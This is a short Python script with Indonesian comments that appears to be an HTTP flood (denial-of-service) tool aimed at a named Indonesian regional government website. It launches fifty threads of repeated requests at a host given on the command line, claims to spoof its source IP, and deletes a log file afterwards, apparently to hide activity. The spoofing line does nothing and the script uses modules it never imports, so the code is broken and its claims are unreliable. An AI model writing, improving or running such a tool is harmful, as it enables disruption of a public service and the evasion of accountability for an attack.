import time
import threading
import random
import requests
import os

# URL untuk menguji flood
url = "https://jdih.cianjurkab.go.id"

# Fungsi untuk membuat IP acak
def get_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

# Fungsi untuk melakukan request
def make_request(host, num_requests):
    while num_requests > 0:
        try:
            # Mengganti IP Anda dengan IP lain yang acak
            ip = get_random_ip()
            socket.gethostbyname_ex('www.google.com')[2][0] = ip
            response = requests.get(f"{host}")
            response.raise_for_status()
            # Operasi CPU intensif
            for _ in range(1000000):
                random.randint(1, 100)
            response.close()
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
        finally:
            num_requests -= 1
            time.sleep(0.01)

# Jalankan request secara paralel
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python dsa.py <host> <num_requests>")
        sys.exit(1)

    host = sys.argv[1]
    num_requests = int(sys.argv[2])

    threads = []
    for _ in range(50):
        t = threading.Thread(target=make_request, args=(host, num_requests))
        threads.append(t)
        t.start()

    # Tunggu hingga semua request selesai
    for t in threads:
        t.join()

    print("Flood selesai!")

    # Menghapus file log
    os.remove("log.txt")
